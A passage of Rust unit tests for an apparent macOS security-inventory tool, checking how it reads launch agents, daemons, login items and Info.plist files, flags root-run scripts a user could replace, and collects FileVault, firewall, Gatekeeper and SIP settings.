        let info = |name: &str, body: &str| {
            let contents = tmp.path().join(name).join("Contents");
            fs::create_dir_all(&contents).unwrap();
            fs::write(contents.join("Info.plist"), body).unwrap();
            tmp.path().join(name)
        };
        let error = |bundle: &Path| {
            let mut failures = Vec::new();
            let item = bundle_item(ItemKind::LoginItem, bundle, &Cancel::new(), &mut failures);
            assert!(failures.is_empty(), "{failures:?}");
            item.error.unwrap_or_default()
        };

        let up = info(
            "Up.app",
            &plist_text("<key>CFBundleExecutable</key><string>../../x</string>"),
        );
        assert!(error(&up).ends_with("\"../../x\", which is not in the app"));
        let absolute = info(
            "Abs.app",
            &plist_text("<key>CFBundleExecutable</key><string>/bin/ls</string>"),
        );
        assert!(error(&absolute).contains("\"/bin/ls\", which is not in the app"));
        let unnamed = info("None.app", &plist_text(""));
        assert_eq!(
            error(&unnamed),
            "its Info.plist names no CFBundleExecutable"
        );

        // Exactly the limit is read; one byte more is not.
        let text = plist_text("<key>CFBundleExecutable</key><string>A</string>");
        let limit = usize::try_from(PLIST_LIMIT).unwrap();
        let padded = format!(
            "{text}<!-- {} -->",
            " ".repeat(limit - text.len() - "<!--  -->".len())
        );
        let at_limit = info("Limit.app", &padded);
        assert_eq!(error(&at_limit), "");
        let over = info("Over.app", &format!("{padded}\n"));
        let limit_error = format!("its Info.plist is more than the {PLIST_LIMIT} bytes read");
        assert_eq!(error(&over), limit_error);

        // A bundle path through a file is not "not there".
        let file = tmp.path().join("file");
        fs::write(&file, "").unwrap();
        assert!(error(&file.join("B.app")).starts_with("cannot read the app"));
    }

    #[test]
    fn a_bundle_program_that_leaves_the_app_is_not_checked() {
        let tmp = tempfile::tempdir().unwrap();
        let agents = tmp.path().join("A.app/Contents/Library/LaunchAgents");
        fs::create_dir_all(&agents).unwrap();
        let path = plist(
            &agents,
            "a.plist",
            "<key>BundleProgram</key><string>/bin/ls</string>",
        );
        let program = read(ItemKind::AppLaunchAgent, &path).program.unwrap();
        assert_eq!(program.path, Path::new("/bin/ls"));
        assert!(
            matches!(program.signature, Signature::Unreadable { ref detail, .. }
                if detail.contains("not a path inside the app")),
            "{:?}",
            program.signature
        );
    }

    #[test]
    fn only_what_runs_as_root_is_marked_replaceable() {
        let me = Account::current(&Cancel::new()).unwrap().unwrap();
        let tmp = tempfile::tempdir().unwrap();
        let mine = tmp.path().join("run");
        fs::write(&mine, "").unwrap();
        let job = |kind, user: &str| {
            let user = match user {
                "" => String::new(),
                name => format!("<key>UserName</key><string>{name}</string>"),
            };
            let body = format!(
                "<key>ProgramArguments</key><array><string>/bin/sh</string>\
                 <string>{}</string></array>{user}",
                mine.display()
            );
            let name = format!("{}.plist", tmp.path().read_dir().unwrap().count());
            read(kind, &plist(tmp.path(), &name, &body))
        };
        let mut items = [
            job(ItemKind::LaunchDaemon, ""),
            job(ItemKind::AppLaunchDaemon, "root"),
            job(ItemKind::LaunchDaemon, "nobody"),
            job(ItemKind::LaunchAgent, ""),
        ];
        let before: Vec<String> = items.iter().map(Item::identity).collect();
        mark_replaceable(&mut items, &me);

        let marked: Vec<(bool, bool)> = items
            .iter()
            .map(|item| {
                (
                    item.program.as_ref().unwrap().replaceable,
                    item.scripts[0].replaceable,
                )
            })
            .collect();
        // `/bin/sh` is the system's; the script is this user's.
        assert_eq!(
            marked,
            [(false, true), (false, true), (false, false), (false, false)]
        );
        let line = serde_json::to_string(&items[0]).unwrap();
        assert!(line.contains(r#""replaceable":true"#), "{line}");
        assert_ne!(
            items[0].identity(),
            before[0],
            "a new way to root is a new issue"
        );
        assert_eq!(
            items[3].identity(),
            before[3],
            "unmarked items keep their keys"
        );
    }

    #[test]
    fn what_the_account_decides_is_known_by_its_path() {
        assert!(needs_account("/Library/LaunchDaemons/a.plist"));
        assert!(needs_account(
            "/Applications/A.app/Contents/Library/LaunchDaemons/d.plist"
        ));
        assert!(needs_account("/usr/lib/cron/tabs/me"));
        assert!(needs_account("/etc/zshrc"));
        assert!(needs_account("/usr/local/etc/periodic/daily/x"));
        assert!(!needs_account("/Library/LaunchAgents/a.plist"));
        assert!(!needs_account("/Users/me/.zshrc"));
        assert!(!needs_account("/etcetera/x"));
    }

    #[test]
    fn a_launch_folder_item_keeps_its_identity_and_a_registered_one_its_switches() {
        let tmp = tempfile::tempdir().unwrap();
        let path = plist(
            tmp.path(),
            "a.plist",
            "<key>Program</key><string>/bin/ls</string>",
        );
        let mut item = read(ItemKind::LaunchAgent, &path);
        // Only an item from the records has switches, so the identities of the folders' items,
        // and the dismissals they key, are as they were before the records were read.
        assert_eq!(
            item.identity(),
            r#"{"arguments":[],"disabled":false,"environment":{},"program":["/bin/ls","apple"],"#
                .to_owned()
                + r#""run_at_load":false,"scripts":[],"unread":null,"user_name":null}"#
        );

        let on = |enabled, allowed| Some(background::Switches { enabled, allowed });
        item.login_items = on(true, true);
        let allowed = item.identity();
        item.login_items = on(true, false);
        assert_ne!(item.identity(), allowed, "turned off in Login Items");
    }

    #[test]
    fn a_bundle_program_counts_only_inside_an_app() {
        let tmp = tempfile::tempdir().unwrap();
        let agents = tmp.path().join("A.app/Contents/Library/LaunchAgents");
        fs::create_dir_all(&agents).unwrap();
        let body = "<key>BundleProgram</key><string>Contents/MacOS/A</string>\
             <key>Program</key><string>/bin/ls</string>";
        let path = plist(&agents, "a.plist", body);

        let registered = read(ItemKind::AppLaunchAgent, &path);
        let program = registered.program.unwrap().path;
        assert_eq!(program, tmp.path().join("A.app/Contents/MacOS/A"));
        // launchd ignores `BundleProgram` in a launch folder's property list.
        let folder = read(ItemKind::LaunchAgent, &path);
        assert_eq!(folder.program.unwrap().path, Path::new("/bin/ls"));

        assert_eq!(
            app_of(Path::new("/A.app/Contents/Library/LaunchAgents/a.plist")),
            Some(Path::new("/A.app"))
        );
        assert_eq!(
            app_of(Path::new("/A.app/Library/LaunchAgents/a.plist")),
            None
        );
    }

    #[test]
    fn this_macs_settings_and_items_are_read() {
        // macOS ships every settings tool, so each one answers on any Mac, CI's included.
        let mut inventory = Inventory::default();
        let settings = posture(&mut inventory, &Cancel::new());
        let keys: Vec<&str> = settings.keys().copied().collect();
        assert_eq!(
            keys,
            [
                "filevault",
                "firewall",
                "gatekeeper",
                "system_integrity_protection"
            ]
        );
        assert!(
            settings.values().all(|state| !state.is_empty()),
            "{settings:?}"
        );
        assert!(inventory.problems.is_empty(), "{:?}", inventory.problems);

        // No test of this crate sets `VIGIL_TEST_LAUNCH_ROOT`, so this reads the real folders.
        assert_eq!(system_root(), Path::new("/"));
        let mut inventory = Inventory::default();
        let host = collect(&mut inventory, &Cancel::new());
        // macOS 27.2's layout reads, where this process has Full Disk Access; elsewhere the
        // folder is a note, and no failure.
        assert!(
            !inventory.failed.contains(&InventorySource::BackgroundItems),
            "{:?}",
            inventory.problems
        );
        let noted = inventory
            .problems
            .iter()
            .any(|e| matches!(e, InventoryError::FullDiskAccess { .. }));
        assert_eq!(noted, needs_full_disk_access());
        assert_eq!(host.settings.len(), POSTURE.len());
        assert_eq!(host.files.len(), 2);
        assert!(host.files[0].1.contains("system_integrity_protection"));
    }

    #[test]
    fn host_files_and_keys_come_from_what_was_read() {
        let tmp = tempfile::tempdir().unwrap();
        let path = plist(tmp.path(), "a.plist", "");
        let item = read(ItemKind::LaunchAgent, &path);
        let identity = item.identity();
        let settings = BTreeMap::from([("filevault", "FileVault is On.".to_owned())]);
        let host = Host::new(&settings, &[item], &[]);

        assert_eq!(host.settings, ["filevault"]);
        assert_eq!(host.items[path.to_str().unwrap()], identity);
        let names: Vec<&str> = host.files.iter().map(|(n, _)| n.as_str()).collect();
        assert_eq!(names, ["mac/settings.json", "mac/persistence.jsonl"]);
        assert!(host.files[0].1.contains("FileVault is On."));
        assert_eq!(host.files[1].1.lines().count(), 1);
    }
}
